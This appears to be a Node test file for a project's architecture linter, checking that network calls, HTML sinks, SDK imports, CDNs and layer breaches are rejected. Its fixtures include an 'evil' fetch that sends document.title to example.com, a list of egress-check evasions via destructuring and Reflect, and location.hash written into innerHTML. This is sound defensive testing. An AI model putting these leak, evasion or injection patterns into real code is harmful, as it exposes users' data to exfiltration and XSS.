// The architecture checks (arch.mjs): the real tree passes, and a deliberate
// violation of each rule fails with a message naming its boundary.
//   node test/arch-node.mjs
import assert from 'node:assert/strict';
import { execSync } from 'node:child_process';
import { checkArchitecture, checkMetafile, checkNoCdn, countEscapes, loadTree, NETWORK } from '../arch.mjs';

let passed = 0;
async function test(name, fn) { await fn(); passed++; console.log('ok', name); }

const tree = loadTree();
// The tree with one file changed (text appended, or replaced by a function of it).
const withFile = (path, change) => {
  const files = new Map(tree);
  files.set(path, typeof change === 'function' ? change(files.get(path) ?? '') : (files.get(path) ?? '') + '\n' + change + '\n');
  return files;
};
const fails = (files, rule, path, what) => {
  const errors = checkArchitecture(files);
  const hit = errors.find((e) => e.startsWith(`[${rule}] ${path}`) && (!what || what.test(e)));
  assert.ok(hit, `expected a [${rule}] error for ${path}; got:\n  ${errors.join('\n  ') || '(none)'}`);
  return hit;
};

await test('the real tree passes every rule', () => {
  assert.deepEqual(checkArchitecture(tree), []);
});

await test('egress: a network API outside the egress modules fails, naming the boundary', () => {
  const msg = fails(withFile('src/interface/tree.ts', "fetch('https://example.com/?' + document.title);"), 'egress', 'src/interface/tree.ts', /uses fetch/);
  assert.match(msg, /Plaintext must leave Pouch only through modules/);
  fails(withFile('src/vfs.ts', 'navigator.sendBeacon("/x", "y");'), 'egress', 'src/vfs.ts', /sendBeacon/);
  fails(withFile('src/editor.ts', 'const ws = new WebSocket("wss://example.com");'), 'egress', 'src/editor.ts', /WebSocket/);
  fails(withFile('src/markdown.ts', 'const m = await import(location.hash.slice(1));'), 'egress', 'src/markdown.ts', /import\(\)/);
  fails(withFile('src/tools.ts', "const w = new Worker('https://example.com/w.js');"), 'egress', 'src/tools.ts', /Worker/);
  fails(withFile('src/agent.ts', "globalThis['fetch']('https://example.com');"), 'egress', 'src/agent.ts', /fetch/);
  // An allowed module may use only the APIs it is allowed.
  fails(withFile('src/models.ts', 'new EventSource("/x");'), 'egress', 'src/models.ts', /EventSource/);
  // A local named fetch is not the network; overwriting the global removes it.
  assert.deepEqual(checkArchitecture(withFile('src/graph.ts', 'export const viaFetch = (fetch) => fetch("/x"); self.fetch = () => { throw new Error("no network"); };')), []);
  // Comments and strings are not code.
  assert.deepEqual(checkArchitecture(withFile('src/graph.ts', '// fetch(url)\nexport const note = "new WebSocket(url)";')), []);
});

await test('egress: destructuring, literal keys and reflection do not get around it', () => {
  const evasions = [
    'const { fetch: request } = globalThis; request("https://example.com");',
    'const { fetch } = window; fetch("https://example.com");',
    'const { navigator: { sendBeacon: b } } = self; b("/x", "y");',
    "const { ['fetch']: r } = globalThis; r('/x');",
    "const { 'WebSocket': W } = globalThis; new W('wss://example.com');",
    'let f; ({ fetch: f } = globalThis); f("/x");',
    'let g; ({ a: { fetch: g } } = { a: globalThis }); g("/x");',
    "Reflect.get(globalThis, 'fetch')('/x');",
    'window.fetch("/x");',
    'globalThis[`fetch`]("/x");',
    'run({ fetch });',
  ];
  for (const code of evasions) fails(withFile('src/agent.ts', code), 'egress', 'src/agent.ts', /uses (fetch|sendBeacon|WebSocket)/);
  // Passing a module's own function under the name is not the network.
  assert.deepEqual(checkArchitecture(withFile('src/graph.ts', 'const own = () => 1; export const opts = { fetch: own };')), []);
});

await test('egress: a bundled first-party file the scan never read fails (.mjs, .ts)', () => {
  const evil = "fetch('https://example.com/?' + document.title);";
  fails(withFile('src/leak.mjs', evil), 'egress', 'src/leak.mjs', /uses fetch/);
  fails(withFile('src/leak.ts', 'const u: string = "https://example.com"; ' + evil), 'egress', 'src/leak.ts', /uses fetch/);
  assert.match(checkMetafile({ inputs: { 'src/unscanned.mjs': { imports: [] } } })[0], /^\[egress\] src\/unscanned.mjs: is bundled but was not scanned/);
  assert.deepEqual(checkMetafile({ inputs: { 'src/main.ts': { imports: [] }, 'node_modules/x/index.js': { imports: [] }, '<define:LOCAL_MODEL>': { imports: [] } } }), []);
});

await test('egress: an allowance nobody uses fails, so the list stays exact', () => {
  assert.ok(NETWORK['src/offline.ts']);
  fails(withFile('src/offline.ts', (t) => t.replaceAll('fetch(', 'Promise.reject(')), 'egress', 'src/offline.ts', /no longer uses it/);
});

await test('html: an HTML sink outside viewer.html fails', () => {
  const msg = fails(withFile('src/preview.ts', 'export const put = (node, s) => { node.innerHTML = s; };'), 'html', 'src/preview.ts', /innerHTML/);
  assert.match(msg, /only viewer.html/);
  fails(withFile('src/interface/transcript.ts', "const card = el('div', { innerHTML: '<b>x</b>' });"), 'html', 'src/interface/transcript.ts', /innerHTML/);
  // A key in any spelling, and a destructured or reflective one.
  fails(withFile('src/interface/transcript.ts', "const report = location.hash; el('div', { 'innerHTML': report });"), 'html', 'src/interface/transcript.ts', /innerHTML/);
  fails(withFile('src/interface/transcript.ts', "el('div', { ['outerHTML']: location.hash });"), 'html', 'src/interface/transcript.ts', /outerHTML/);
  fails(withFile('src/interface/transcript.ts', 'const innerHTML = location.hash; el("div", { innerHTML });'), 'html', 'src/interface/transcript.ts', /innerHTML/);
  fails(withFile('src/dom.ts', "Reflect.set(document.body, 'innerHTML', location.hash);"), 'html', 'src/dom.ts', /innerHTML/);
  fails(withFile('src/dom.ts', "const { insertAdjacentHTML: put } = document.body; put.call(document.body, 'beforeend', location.hash);"), 'html', 'src/dom.ts', /insertAdjacentHTML/);
  fails(withFile('src/viewer.ts', "const f = document.createElement('iframe'); f.srcdoc = '<p>';"), 'html', 'src/viewer.ts', /srcdoc/);
  fails(withFile('src/dom.ts', "document.write('<p>');"), 'html', 'src/dom.ts', /document.write/);
  fails(withFile('src/markdown.ts', "new DOMParser().parseFromString('<p>', 'text/html');"), 'html', 'src/markdown.ts', /parseFromString/);
  fails(withFile('pouch.html', (t) => t.replace('</body>', "<script>document.body.insertAdjacentHTML('beforeend', location.hash);</script></body>")), 'html', 'pouch.html', /insertAdjacentHTML/);
  // However the tag is written.
  fails(withFile('pouch.html', (t) => t.replace('</body>', '<SCRIPT type="module">fetch("https://example.com")</SCRIPT foo></body>')), 'egress', 'pouch.html', /uses fetch/);
});

await test('sealed: only src/sealed.ts imports tinfoil or reaches into its client', () => {
  const msg = fails(withFile('src/agent.ts', "import { TinfoilAI } from 'tinfoil';"), 'sealed', 'src/agent.ts', /imports tinfoil/);
  assert.match(msg, /attestation and origin checks/);
  fails(withFile('src/interface/connection.ts', 'const leak = (c) => c.secureClient.fetch;'), 'sealed', 'src/interface/connection.ts', /secureClient/);
  fails(withFile('src/naming.ts', 'const k = (c) => c.openAIOptions.apiKey;'), 'sealed', 'src/naming.ts', /openAIOptions/);
  fails(withFile('src/naming.ts', "const k = ({ 'secureClient': s }) => s.fetch;"), 'sealed', 'src/naming.ts', /secureClient/);
  // The metafile: what really imports the SDK into the bundle.
  const meta = (from) => ({ inputs: { [from]: { imports: [{ path: 'node_modules/tinfoil/dist/index.browser.js' }] }, 'node_modules/tinfoil/dist/index.browser.js': { imports: [{ path: 'node_modules/tinfoil/dist/secure.js' }] } } });
  assert.deepEqual(checkMetafile(meta('src/sealed.ts')), []);
  assert.match(checkMetafile(meta('src/interface/connection.ts'))[0], /^\[sealed\] src\/interface\/connection.ts/);
});

await test('cdn: a third-party CDN in the page fails; a URL only compared against does not', () => {
  assert.match(checkNoCdn('<script>import("https://cdn.jsdelivr.net/npm/x")</script>', 'pouch.html')[0], /^\[cdn\].*third-party/);
  assert.deepEqual(checkNoCdn('const issuer="https://token.actions.githubusercontent.com"', 'pouch.html'), []);
});

await test('layers: the core imports no UI, and only main.ts imports the Interface', () => {
  const msg = fails(withFile('src/vfs.ts', "import { $ } from './dom.ts';"), 'layers', 'src/vfs.ts', /is core but imports src\/dom.ts/);
  assert.match(msg, /UI depends on the core, never the reverse/);
  fails(withFile('src/ns/watch.ts', "import { createUsage } from '../usage.ts';"), 'layers', 'src/ns/watch.ts', /imports src\/usage.ts/);
  fails(withFile('src/tools.ts', "import { createTreeRegion } from './interface/tree.ts';"), 'layers', 'src/tools.ts', /imports the Interface/);
});

await test('seams: a region is imported only through its entry modules', () => {
  const msg = fails(withFile('src/tools.ts', "import { RunHost } from './run/host.ts';"), 'seams', 'src/tools.ts', /inside src\/run\//);
  assert.match(msg, /Import src\/run.ts instead/);
  fails(withFile('src/agent.ts', "import './local/worker.ts';"), 'seams', 'src/agent.ts', /inside src\/local\//);
  // Interface regions reach each other through app, never by import.
  fails(withFile('src/interface/tree.ts', "import { createEditingRegion } from './editing.ts';"), 'seams', 'src/interface/tree.ts', /inside src\/interface\//);
});

await test('contract: types only, imported only as types, and may then cross a seam', () => {
  fails(withFile('src/trust.ts', 'export const DEFAULT_GRANT = "web";'), 'contract', 'src/trust.ts', /has a statement that runs/);
  fails(withFile('src/trust.ts', "import { normalize } from './vfs.ts';"), 'contract', 'src/trust.ts', /has a statement that runs/);
  const msg = fails(withFile('src/egress.ts', "import { type Authority } from './trust.ts';\nimport * as trust from './trust.ts';"), 'contract', 'src/egress.ts', /imports src\/trust.ts as a value/);
  assert.match(msg, /Use `import type`/);
  // Interface regions share the App type without importing each other's code.
  assert.deepEqual(checkArchitecture(withFile('src/interface/tree.ts', "import type { App } from './app.ts';")), []);
  fails(withFile('src/interface/tree.ts', "import { App } from './app.ts';"), 'contract', 'src/interface/tree.ts', /as a value/);
  assert.deepEqual(checkArchitecture(withFile('src/interface/app.ts', "import type { TreeRegion } from './tree.ts';")), []);
  // A type-only import still respects layers: the core does not lean on UI types either.
  fails(withFile('src/vfs.ts', "import type { App } from './interface/app.ts';"), 'layers', 'src/vfs.ts', /imports the Interface/);
});

await test('exact: no `any` in trust-boundary modules, wherever it is written', () => {
  for (const [path, code] of [['src/sealed.ts', 'export const x = (r: any) => r;'], ['src/egress.ts', 'let y = 1 as any;'],
    ['src/ns/control.ts', 'type T = Record<string, any>;'], ['src/trust.ts', 'export type Loose = any[];']]) {
    fails(withFile(path, code), 'exact', path, /uses `any`/);
  }
  // Elsewhere `any` is tsc's business, and comments and strings never count.
  assert.deepEqual(checkArchitecture(withFile('src/graph.ts', 'export const z = (v: any) => v; // any\nexport const w = "any";')), []);
});

await test('escapes: casts and non-null assertions only go down, and escapes.json stays exact', () => {
  const grow = (code) => checkArchitecture(withFile('src/graph.ts', code), tree.escapes);
  assert.ok(grow('export const a = (x: unknown) => x as string;').some((e) => /^\[escapes\] src\/graph.ts: has \d+ `as`, over its/.test(e)));
  assert.ok(grow('export const b = (x?: string) => x!;').some((e) => /has \d+ `!`, over/.test(e)));
  const dbl = grow('export const c = (x: number) => x as unknown as string;');
  assert.ok(dbl.some((e) => /`as unknown as`, over/.test(e)) && !dbl.some((e) => /`as`, over/.test(e)), 'a double cast counts once, as itself');
  assert.deepEqual(grow('export const d = [1, 2] as const;'), [], '`as const` is not an escape');
  // Paying one down fails until the file records it, so it cannot grow back unnoticed.
  const n = countEscapes(tree)['src/graph.ts']?.as ?? 0;
  const slack = { ...tree.escapes, 'src/graph.ts': { ...tree.escapes['src/graph.ts'], as: n + 1 } };
  assert.ok(checkArchitecture(tree, slack).some((e) => /src\/graph.ts: has \d+ `as`, under its/.test(e)));
});

await test('size: a module over its budget fails; main.ts stays thin', () => {
  fails(withFile('src/graph.ts', (t) => t + '\n'.repeat(800)), 'size', 'src/graph.ts', /over its budget of 700/);
  fails(withFile('src/main.ts', (t) => t + '// x\n'.repeat(60)), 'size', 'src/main.ts', /over its budget of 60/);
});

await test('the pre-split main.js (2974dda) fails egress, sealed and size', () => {
  let old;
  try { old = execSync('git show 2974dda:pouch/src/main.js', { cwd: import.meta.dirname, stdio: ['ignore', 'pipe', 'ignore'] }).toString(); }
  catch { console.log('  (skipped: commit 2974dda not in this clone)'); return; }
  const errors = checkArchitecture(withFile('src/main.ts', () => old));
  for (const rule of ['egress', 'sealed', 'size']) assert.ok(errors.some((e) => e.startsWith(`[${rule}] src/main.ts`)), rule);
});

console.log(`${passed} passed`);
